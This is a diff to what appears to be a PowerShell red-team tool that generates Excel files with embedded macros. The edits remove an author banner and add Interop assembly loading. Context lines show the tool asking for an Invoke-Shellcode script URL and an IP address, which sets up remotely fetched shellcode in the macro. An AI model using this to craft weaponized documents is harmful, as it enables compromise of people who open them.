@@ -57,11 +57,6 @@ PS>
 
 
 #>
-Write-Host  "  -------------------------------------------------------------"
-Write-Host " |                 Created by Matt Nelson                      |"
-Write-Host " |                 twitter.com/enigma0x3                       |"
-Write-Host " |                www.enigma0x3.wordpress.com                  |"
-Write-Host  "  -------------------------------------------------------------"
 $global:defLoc = "$env:userprofile\Desktop"
 $global:IS_Url = Read-Host "Enter URL of Invoke-Shellcode script (If you use GitHub, use the raw version)"
 $global:IP = Read-Host "Enter IP Address"
@@ -156,6 +151,7 @@ $ExcelModule.CodeModule.AddFromString($Code)
 
 
 #Save the document
+Add-Type -AssemblyName Microsoft.Office.Interop.Excel
 $Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
 Write-Output "Saved to file $global:Fullname"
 
@@ -263,6 +259,7 @@ $ExcelModule.CodeModule.AddFromString($Code)
 
 
 #Save the document
+Add-Type -AssemblyName Microsoft.Office.Interop.Excel
 $Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
 Write-Output "Saved to file $global:Fullname"
 
@@ -435,6 +432,7 @@ $ExcelModule.CodeModule.AddFromString($Code)
 
 
 #Save the document
+Add-Type -AssemblyName Microsoft.Office.Interop.Excel
 $Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
 Write-Output "Saved to file $global:Fullname"
 
